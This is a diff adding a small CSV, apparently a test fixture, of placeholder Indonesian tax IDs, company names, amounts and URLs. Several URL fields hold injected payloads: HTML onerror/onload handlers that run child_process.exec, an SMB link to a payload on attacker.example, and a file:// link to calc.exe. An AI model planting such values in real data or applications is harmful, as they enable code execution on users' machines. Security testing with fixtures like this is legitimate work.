@@ -1,0 +1,6 @@
+npwp,nama,jumlah,situs
+01.234.567.8-901.000,PT Alpha Konsultan,1500000,https://example.com/profil?id=1
+02.345.678.9-012.000,PT Beta Audit,2750000,https://example.com/<img/src/onerror=require(`child_process`).exec(`calc`)>
+03.456.789.0-123.000,CV Gamma,980000,https://example.com/<svg/onload=require(`child_process`).exec(`calc`)>
+04.567.890.1-234.000,PT Delta,0,smb://attacker.example/share/payload.exe
+05.678.901.2-345.000,PT Epsilon,4200000,file:///C:/Windows/System32/calc.exe
